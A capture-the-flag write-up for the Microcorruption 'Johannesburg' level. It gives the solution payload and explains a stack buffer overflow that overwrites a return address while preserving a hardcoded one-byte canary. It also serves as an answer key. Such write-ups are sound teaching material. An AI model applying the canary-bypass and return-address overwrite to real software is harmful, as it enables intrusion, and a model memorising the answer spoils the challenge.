# 09: Johannesburg

- _Points:_ 20 points
- _Version number_: b.04

## Password

```
4141414141414141414141414141414141464644
```

## Manual

```
Lockitall                                            LOCKIT PRO r b.04
______________________________________________________________________

              User Manual: Lockitall LockIT Pro, rev b.04
______________________________________________________________________


OVERVIEW

    - A firmware update rejects passwords which are too long.
    - This lock is attached the the LockIT Pro HSM-1.


DETAILS

    The LockIT Pro b.04  is the first of a new series  of locks. It is
    controlled by a  MSP430 microcontroller, and is  the most advanced
    MCU-controlled lock available on the  market. The MSP430 is a very
    low-power device which allows the LockIT  Pro to run in almost any
    environment.

    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
    be inaccessable from the exterior of the building.

    There  is no  default  password  on the  LockIT  Pro HSM-1.   Upon
    receiving the  LockIT Pro,  a new  password must  be set  by first
    connecting the LockitPRO HSM to  output port two, connecting it to
    the LockIT Pro App, and entering a new password when prompted, and
    then restarting the LockIT Pro using the red button on the back.

    LockIT Pro Hardware  Security Module 1 stores  the login password,
    ensuring users  can not access  the password through  other means.
    The LockIT Pro  can send the LockIT Pro HSM-1  a password, and the
    HSM will  return if the password  is correct by setting  a flag in
    memory.

    This is Hardware  Version B.  It contains  the Bluetooth connector
    built in, and two available  ports: the LockIT Pro Deadbolt should
    be  connected to  port  1,  and the  LockIT  Pro  HSM-1 should  be
    connected to port 2.

    This is Software Revision 04. We have improved the security of the
    lock by ensuring passwords that are too long will be rejected.




(c) 2013 LOCKITALL                                            Page 1/1
```

## Writeup

This level is an extension of Level 05 (Cusco), as we are able to overwrite the return address with a buffer that is too large.

This time, we see that the `getsn` function loads our input to `2400`, which is quite far away from the rest of the stack. However, there is an unbounded `strcpy` call in `login`, which allows us to overrun the buffer size of 16 bytes all the same at `43ec`:

```
43e0:   0000 f245 0200 0024 3f00 6245 4141 4141   ...E...$?.bEAAAA
43f0:   0000 0000 0000 0000 0000 0000 0046 3c44   .............F<D
```

We can put our target return address to `unlock_door`, `0x4644` at bytes 19-20.

This time, it seems that there is a hardcoded "canary" located at the 18th byte, with a value of `0x46`. This canary value is indeed checked in the `login` function, which then calls the `__stop_progExec__` function if it was overwritten. Because of this, we must make sure that the canary is overwritten with the same value of `0x46`, so that we can reach the `ret` function. These can be seen below:

```
4578:  f190 4600 1100 cmp.b #0x46, 0x11(sp)
457e:  0624           jeq   #0x458c <login+0x60>
4580:  3f40 ff44      mov   #0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call  #0x45f8 <puts>
4588:  3040 3c44      br    #0x443c <__stop_progExec__>
458c:  3150 1200      add   #0x12, sp
```

As such, we can come up with the following payload:

```
4141414141414141414141414141414141464644
```

If we are feeling lazy, since the canary is only a single byte, we could have afforded to fill up the rest of the buffer with `0x46` which would have worked all the same.
